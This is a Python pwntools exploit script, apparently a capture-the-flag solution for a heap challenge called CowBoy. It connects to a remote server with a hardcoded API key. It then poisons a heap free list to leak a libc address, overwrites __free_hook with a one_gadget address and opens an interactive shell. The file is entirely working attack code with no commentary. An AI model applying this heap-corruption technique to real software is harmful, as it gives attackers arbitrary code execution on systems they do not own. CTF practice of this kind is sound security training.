from pwn import *
import json

context.log_level = 'debug'

p = remote('cowboy.eatpwnnosleep.com', 14697)

a = {
    'apikey' : '003b1b624e8178ca00c495a2be68c37ae5cc945080eb286fb6bf3a476d7bf347',
}

p.send(json.dumps(a).encode())
print (p.recv(102400))
#p = process('./CowBoy_fb009bfafd91a8c5211c959cc3a5fc7a4ae8ad5d', env={"LD_PRELOAD":"/home/insu/sctf/CowBoy/disable-alarm/libhook.so"})

def banner():
    p.recvuntil("5. exit\n----------------------------------------\n")

def alloc(sz):
    banner()
    p.send("1\n")
    p.send("%d\n" % sz)
    p.recvuntil(" n < 2049: ")
    return int(p.readline().split(" = ")[1], 16)

def fill(bin_num, chunk_num, data):
    banner()
    p.send("4\n")
    p.send("%d\n" % bin_num)
    p.send("%d\n" % chunk_num)
    p.send(data)

def show():
    banner()
    p.send("3\n")
    return p.readline()

def dealloc(bin_num, chunk_num):
    banner()
    p.send("2\n")
    p.send("%d\n" % bin_num)
    p.send("%d\n" % chunk_num)

RAND_OFF = 0x000000000003af60

ptr = alloc(0)
fill(0, 0, "A"*8 + p64(0x602090))
ptr = alloc(0)

r = show()
bin_base = int(r.split(" ")[-2], 16) - RAND_OFF
print("BIN_BASE: %x" % bin_base)

free_hook = bin_base + 0x3C3EF8

fill(0, 0, "A"*8 + p64(free_hook))
ptr = alloc(0)
show()
one_gadget = bin_base + 0x4526a
fill(0, 4, p64(one_gadget) + "B"*8)

p.interactive()
